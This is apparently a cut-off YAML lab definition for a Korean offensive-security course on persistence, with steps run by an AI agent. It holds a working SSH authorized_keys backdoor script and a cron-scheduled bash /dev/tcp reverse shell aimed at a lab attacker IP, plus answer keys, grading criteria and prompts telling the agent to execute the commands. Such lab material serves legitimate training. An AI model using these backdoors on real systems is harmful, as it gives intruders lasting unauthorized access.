lab_id: attack-ai-week09
title: 지속성 확보 (Persistence) (AI 지원)
version: ai
course: attack-ai
week: 9
description: 시스템 접근을 유지하기 위한 지속성(Persistence) 기법을 실습한다. 백도어 설치, SSH 키 주입, cron 악용,
  systemd 서비스 등록 등 다양한 방법으로 재접근 경로를 확보한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- MITRE ATT&CK Persistence 전술의 주요 기법을 이해한다
- SSH 키 기반 백도어, cron 기반 지속성을 설정할 수 있다
- 지속성 기법의 탐지 방법과 제거 방법을 학습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 공격자 머신에서 SSH 키 쌍을 생성하고, web 서버({{WEB_IP}})의 authorized_keys에 공개키를 추가하여
    비밀번호 없이 접속할 수 있게 하라.
  hint: |
    ssh-keygen으로 키를 생성하고 ssh-copy-id 또는 수동으로 공개키를 추가한다.

    📎 도구 우선순위 (힌트):
    1) 우선: ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '' -q && cat /tmp/backdoor_key.pub | ssh ccc@10.20.30.80 'cat >> ~/.ssh/authorized_keys'
    2) 미설치: sudo apt install -y openssh-client
    3) 실패/대안:
       - ssh-copy-id -i /tmp/backdoor_key.pub
       - ansible authorized_key 모듈
       - Metasploit sshkey_persistence
       - ssh-keygen -t rsa -b 4096
       - puttygen -t ed25519
       - SSH agent forwarding 악용
       - OpenSSH certs (ssh-keygen -s)
       - Bastion AI 지속성 orchestrator
    4) 검증: T1098.004 SSH Authorized Keys.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 공격자 머신에서 SSH 키 쌍을 생성하고, web 서버(10.20.30.80)의 authorized_keys에 공개키를
    추가하여 비밀번호 없이 접속할 수 있게 해줘

    📎 참고 (CLI): ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '''' -q && ssh ccc@10.20.30.80
    ''mkdir -p ~/.ssh && chmod 700 ~/.ssh'' 2>/dev/null && cat /tmp/backdoor_key.pub
    | ssh ccc@10.20.30.80 ''cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys''
    2>/dev/null && ssh -i /tmp/backdoor_key -o StrictHostKeyChecking=no ccc@10.20.30.80
    ''echo SSH key backdoor successful: $(whoami)'' 2>/dev/null'
  answer_detail: SSH 키 기반 백도어는 가장 은밀한 지속성 기법 중 하나이다. authorized_keys에 공격자의 공개키를 추가하면
    비밀번호 변경과 무관하게 접속이 가능하다. 탐지를 위해 authorized_keys를 정기적으로 감사해야 한다.
  verify:
    type: output_contains
    expect: backdoor successful
    field: stdout
    semantic:
      intent: SSH 키 백도어 설치 — ed25519 키쌍 생성 후 authorized_keys 에 공개키 추가, 비밀번호 변경과 무관한
        지속 접근 확보 (MITRE T1098.004)
      success_criteria:
      - ssh-keygen -t ed25519 로 키쌍 생성
      - ssh + cat >> ~/.ssh/authorized_keys 로 대상 서버 추가
      - ssh -i <key> 접속 후 backdoor successful 메시지 또는 whoami 성공 확인
      acceptable_methods:
      - "ssh-keygen + ssh-copy-id (수기 baseline)."
      - "수동 authorized_keys cat >> 추가."
      - "Metasploit sshkey_persistence."
      - "ansible authorized_key 모듈."
      - "puttygen -t ed25519."
      - "OpenSSH certs (ssh-keygen -s)."
      - "SSH agent forwarding 악용."
      - "authorized_keys command='/bin/bash'."
      - "Bastion AI 지속성 orchestrator."
      negative_signs:
      - 키 생성만 하고 대상 서버 추가 없음
      - authorized_keys 권한(600) 설정 누락
      - 접속 확인 단계 없음
  target_vm: attacker
  script: 'ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '''' -q && ssh ccc@10.20.30.80
    ''mkdir -p ~/.ssh && chmod 700 ~/.ssh'' 2>/dev/null && cat /tmp/backdoor_key.pub
    | ssh ccc@10.20.30.80 ''cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys''
    2>/dev/null && ssh -i /tmp/backdoor_key -o StrictHostKeyChecking=no ccc@10.20.30.80
    ''echo SSH key backdoor successful: $(whoami)'' 2>/dev/null'
  risk_level: medium
  bastion_prompt: '공격자 머신에서 SSH 키 쌍을 생성하고, web 서버(10.20.30.80)의 authorized_keys에 공개키를
    추가하여 비밀번호 없이 접속할 수 있게 해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: web 서버에 cron 기반 리버스 셸 백도어를 설정하라. 매 5분마다 공격자에게 연결을 시도하는 cronjob을 작성하라(실제
    실행은 하지 않고 crontab 형식만 작성).
  hint: |
    crontab -e로 편집하거나 echo로 crontab 형식을 출력한다.

    📎 도구 우선순위 (힌트):
    1) 우선: echo '*/5 * * * * /bin/bash -c "bash -i >& /dev/tcp/10.20.30.201/4444 0>&1" 2>/dev/null' > /tmp/cron_backdoor.txt && cat /tmp/cron_backdoor.txt
    2) 미설치: 기본 cron
    3) 실패/대안:
       - crontab -e (대화형)
       - /etc/cron.d/ 파일 직접
       - /var/spool/cron/crontabs/$USER
       - systemd timer + service
       - at 명령 (단발)
       - inotify-tools watch
       - bash sleep loop daemon
       - Bastion AI 지속성 자동화
    4) 검증: T1053.003 Cron + payload only.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: web 서버에 cron 기반 리버스 셸 백도어를 설정하라 구현 방법과 예시를 설명해줘

    📎 참고 (CLI): echo ''# Cron-based reverse shell persistence'' && echo ''*/5 * *
    * * /bin/bash -c "bash -i >& /dev/tcp/10.20.30.201/4444 0>&1" 2>/dev/null'' >
    /tmp/cron_backdoor.txt && echo ''Cron backdoor payload:'' && cat /tmp/cron_backdoor.txt'
  answer_detail: 'cron 기반 백도어는 설정된 간격으로 반복 실행된다. 공격자의 리스너가 다운되어도 다음 실행 시점에 다시 연결된다.
    탐지: crontab -l로 모든 사용자의 cron을 정기 검사한다.'
  verify:
    type: output_contains
    expect: Cron backdoor payload
    field: stdout
    semantic:
      intent: cron 기반 리버스 셸 persistence — 5분마다 /bin/bash -c bash /dev/tcp 연결 시도하는
        crontab 엔트리 작성 (실행 X, 파일만) — MITRE T1053.003
      success_criteria:
      - '*/5 * * * * 형식 crontab 엔트리 생성'
      - bash reverse shell payload 문자열 포함
      - 'Cron backdoor payload: 라벨 + 내용 출력'
      acceptable_methods:
